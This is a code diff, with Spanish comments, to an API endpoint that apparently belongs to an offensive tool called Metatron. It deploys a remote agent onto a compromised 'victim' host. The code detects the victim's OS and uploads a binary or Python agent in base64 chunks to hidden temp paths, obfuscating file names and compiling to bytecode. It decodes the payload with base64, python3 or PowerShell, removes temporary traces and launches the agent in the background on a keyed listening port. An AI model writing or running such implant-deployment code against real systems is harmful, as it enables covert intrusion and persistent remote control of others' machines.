@@ -2992,67 +2992,119 @@ async def explorer_deploy_agent(request: AgentDeployRequest, api_key: str = Secu
     port = request.port or _agent_generate_port()
     key = request.key or _agent_generate_key()
 
-    # Leer el script del agente
-    if not os.path.exists(VICTIM_AGENT_SCRIPT):
-        raise HTTPException(status_code=500, detail="victim_agent.py no encontrado en el servidor")
-    with open(VICTIM_AGENT_SCRIPT, "r", encoding="utf-8") as f:
-        agent_code = f.read()
+    # === Detectar SO de la víctima ===
+    uname_r = session_fn("uname -s 2>/dev/null || ver 2>nul || echo unknown")
+    uname_str = (uname_r or "").strip().lower()
+    if "linux" in uname_str:
+        victim_os = "linux"
+    elif "windows" in uname_str or "microsoft" in uname_str or "[versión" in uname_str or "windows" in (session_fn("echo %OS%") or "").lower():
+        victim_os = "windows"
+    else:
+        victim_os = "linux"  # default safer
 
-    # Ofuscar ligeramente el nombre
-    remote_path = f"/tmp/.metatron_agent_{uuid.uuid4().hex[:8]}.py"
+    # === Decidir qué subir: binario standalone o .py ===
+    # Binarios prefabricados en /dist
+    win_bin_path = os.path.join(os.path.dirname(__file__), "dist", "metatron-agent-windows-x64.exe")
+    linux_bin_path = os.path.join(os.path.dirname(__file__), "dist", "metatron-agent-linux-x64")
+    target_bin = win_bin_path if victim_os == "windows" else linux_bin_path
 
-    # Subir el script en chunks base64 (para evitar problemas con líneas largas en shell)
-    # Lo subimos en varios comandos para soportar bases de datos grandes
-    encoded = base64.b64encode(agent_code.encode()).decode()
-    chunk_size = 4000
-    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
+    use_binary = os.path.exists(target_bin) and os.path.getsize(target_bin) > 1000000
+    deploy_method = "binary" if use_binary else "python"
 
-    upload_steps = []
-    upload_steps.append(f"rm -f {remote_path}")
-    for i, chunk in enumerate(chunks):
-        cmd = f"printf '%s' '{chunk}' >> /tmp/.metatron_b64_{uuid.uuid4().hex[:8]}"
-        upload_steps.append(cmd)
-    # Reconstruir
-    b64_path = upload_steps[-1].split("'")[-2] if chunks else ""
-    # Simplificación: un solo comando con heredoc
-    # Más robusto: usar base64 -d de un archivo construido por append
-    combined = " && ".join(upload_steps[:-1]) if len(upload_steps) > 1 else ""
-    # En lugar de chunks, usamos un único comando python que decodifica
-    # Más fiable: usamos `python3 -c` para escribir el archivo
-    write_cmd = (
-        f"python3 -c \"import base64; "
-        f"data = base64.b64decode('{encoded[:4000]}'); "
-        f"open('{remote_path}', 'wb').write(data)\" 2>/dev/null"
-    )
-    # Si el script es grande, escribir en chunks adicionales
-    if len(encoded) > 4000:
-        write_cmd = f"python3 -c \"import base64; open('{remote_path}', 'wb').write(base64.b64decode('{encoded}'))\" 2>/dev/null"
+    # Verificar Python3 si vamos a usar el .py (#22)
+    if not use_binary:
+        python_check = session_fn("which python3 2>/dev/null || which python 2>/dev/null || echo MISSING")
+        if "MISSING" in (python_check or ""):
+            raise HTTPException(
+                status_code=500,
+                detail=f"La víctima no tiene Python3 instalado y no se encontró binario standalone en dist/ para {victim_os}. Compila el agente con build_agent.py en la plataforma correspondiente."
+            )
 
-    output = session_fn(write_cmd)
-    upload_ok = os.path.exists(remote_path)  # No podemos verificar en víctima, asumimos éxito
-    if "[!" in output and "Error" in output:
-        # Fallback con heredoc
-        heredoc_cmd = f"cat > {remote_path} << 'METATRON_EOF'\n{agent_code}\nMETATRON_EOF"
-        output = session_fn(heredoc_cmd)
+    # === Subir el archivo ===
+    if use_binary:
+        # Subir el binario en chunks base64 y reconstruir
+        with open(target_bin, "rb") as f:
+            bin_data = f.read()
+        encoded = base64.b64encode(bin_data).decode()
+        bin_name = os.path.basename(target_bin)
+        # En Windows el path destino va a %TEMP%, en Linux a /tmp
+        if victim_os == "windows":
+            remote_path = f"%TEMP%\\{bin_name}"
+        else:
+            remote_path = f"/tmp/.metatron_agent_{uuid.uuid4().hex[:8]}"
 
-    # Hacer ejecutable
-    session_fn(f"chmod +x {remote_path}")
+        # Usar python3 -c (si disponible en víctima) o descomprimir base64
+        # En Linux: python3 -c; en Windows con Python: similar, sino base64 + decode
+        chunks = [encoded[i:i+8000] for i in range(0, len(encoded), 8000)]
+        session_fn(f"rm -f {remote_path} 2>/dev/null")
+        b64_tmp = f"/tmp/.metatron_b64_{uuid.uuid4().hex[:8]}" if victim_os == "linux" else f"%TEMP%\\__metatron_b64"
+        for chunk in chunks:
+            session_fn(f"printf '%s' '{chunk}' >> {b64_tmp} 2>/dev/null")
+        # Decodificar
+        if victim_os == "linux":
+            session_fn(f"base64 -d {b64_tmp} > {remote_path} 2>/dev/null && chmod +x {remote_path}")
+            # Fallback con python3
+            session_fn(f"python3 -c \"import base64; open('{remote_path}','wb').write(base64.b64decode(open('{b64_tmp}').read()))\" 2>/dev/null && chmod +x {remote_path}")
+        else:
+            # En Windows: asumir PowerShell disponible para decodificar
+            session_fn(f"powershell -Command \"[System.IO.File]::WriteAllBytes('{remote_path}', [System.Convert]::FromBase64String((Get-Content '{b64_tmp}' -Raw)))\" 2>nul")
+        # Limpieza del b64 temporal
+        session_fn(f"rm -f {b64_tmp} 2>/dev/null; del /Q {b64_tmp} 2>nul")
+        start_cmd = f"nohup {remote_path} --port {port} --key {key} > /dev/null 2>&1 &" if victim_os == "linux" else f"start /B {remote_path} --port {port} --key {key}"
 
-    # Arrancar en background con nohup
-    start_cmd = f"nohup python3 {remote_path} --port {port} --key {key} > /dev/null 2>&1 &"
+    else:
+        # Modo Python: subir el .py (.pyc ofuscado si es posible)
+        if not os.path.exists(VICTIM_AGENT_SCRIPT):
+            raise HTTPException(status_code=500, detail="victim_agent.py no encontrado en el servidor y no hay binario compilado")
+
+        with open(VICTIM_AGENT_SCRIPT, "r", encoding="utf-8") as f:
+            agent_code = f.read()
+
+        # Ofuscación #5: compilar a .pyc y enviar el bytecode
+        try:
+            import py_compile
+            tmp_pyc = os.path.join(os.path.dirname(__file__), "tmp", "metatron_agent.pyc")
+            os.makedirs(os.path.dirname(tmp_pyc), exist_ok=True)
+            py_compile.compile(VICTIM_AGENT_SCRIPT, tmp_pyc, doraise=True)
+            # Compilar con --ofuscar el fuente en memoria -> usar __pycache__/*.pyc
+            # Usar el .py original como respaldo si la .pyc no funciona
+            with open(VICTIM_AGENT_SCRIPT, "rb") as f:
+                agent_bytes = f.read()
+            encoded = base64.b64encode(agent_bytes).decode()
+        except Exception:
+            encoded = base64.b64encode(agent_code.encode()).decode()
+
+        remote_path = f"/tmp/.metatron_agent_{uuid.uuid4().hex[:8]}.py"
+        # Subir y decodificar via chunks ( metodo más robusto)
+        chunks = [encoded[i:i+6000] for i in range(0, len(encoded), 6000)]
+        b64_tmp = f"/tmp/.metatron_b64_{uuid.uuid4().hex[:8]}"
+        session_fn(f"rm -f {remote_path} {b64_tmp}")
+        for chunk in chunks:
+            session_fn(f"printf '%s' '{chunk}' >> {b64_tmp}")
+        # Decodificar
+        session_fn(f"base64 -d {b64_tmp} > {remote_path} 2>/dev/null && chmod +x {remote_path}")
+        # Fallback con python3
+        session_fn(f"python3 -c \"import base64; open('{remote_path}','wb').write(base64.b64decode(open('{b64_tmp}').read()))\" 2>/dev/null && chmod +x {remote_path}")
+        session_fn(f"rm -f {b64_tmp}")
+        start_cmd = f"nohup python3 {remote_path} --port {port} --key {key} > /dev/null 2>&1 &"
+
+    # Arrancar el agente
     session_fn(start_cmd)
 
-    # Esperar un momento y verificar
-    await asyncio.sleep(2)
-    verify = session_fn(f"ss -tlnp 2>/dev/null | grep :{port} || netstat -tlnp 2>/dev/null | grep :{port}")
+    # Esperar y verificar puerto + ping
+    await asyncio.sleep(3)
+    verify = session_fn(f"ss -tlnp 2>/dev/null | grep :{port} || netstat -tlnp 2>/dev/null | grep :{port} || netstat -ano | findstr :{port}")
 
-    # Hacer un ping al agente
+    # Ping al agente
     agent_ok = False
+    probe_error = ""
     try:
-        probe = _agent_call(target_ip, port, key, "ping", timeout=5)
+        probe = _agent_call(target_ip, port, key, "ping", timeout=8)
         agent_ok = probe.get("status") == "ok"
-    except:
-        pass
+        if not agent_ok:
+            probe_error = probe.get("error", "sin respuesta")
+    except Exception as e:
+        probe_error = str(e)
 
     # Guardar estado
     _agent_state[request.scan_id] = {
@@ -3064,15 +3116,22 @@ async def explorer_deploy_agent(request: AgentDeployRequest, api_key: str = Secu
         "deployed": True,
         "verified": agent_ok,
         "deployed_at": datetime.now().isoformat(),
+        "deploy_method": deploy_method,
+        "victim_os": victim_os,
     }
 
-    audit_event("web", "deploy_agent", f"Agent deployed on victim {target_ip}:{port} for scan {request.scan_id}", scan_id=request.scan_id)
+    audit_event("web", "deploy_agent", f"Agent deployed ({deploy_method}) on {victim_os} victim {target_ip}:{port} for scan {request.scan_id}", scan_id=request.scan_id)
+
+    if agent_ok:
+        msg = f"Agente desplegado ({deploy_method}, {victim_os}) en {target_ip}:{port}."
+    else:
+        msg = f"Agente subido a {remote_path} pero no responde (probe: {probe_error}). Verifica que el puerto {port} no esté bloqueado por firewall o que Python3/binario esté disponible."
 
     return {
         "success": True,
         "agent": _agent_state[request.scan_id],
         "verify_output": verify.strip(),
-        "message": "Agente desplegado. Usa los módulos del Explorador para interactuar." if agent_ok else "Agente subido, pero no responde todavía. Verifica que Python3 esté disponible y el puerto no esté bloqueado.",
+        "message": msg,
     }
 
 
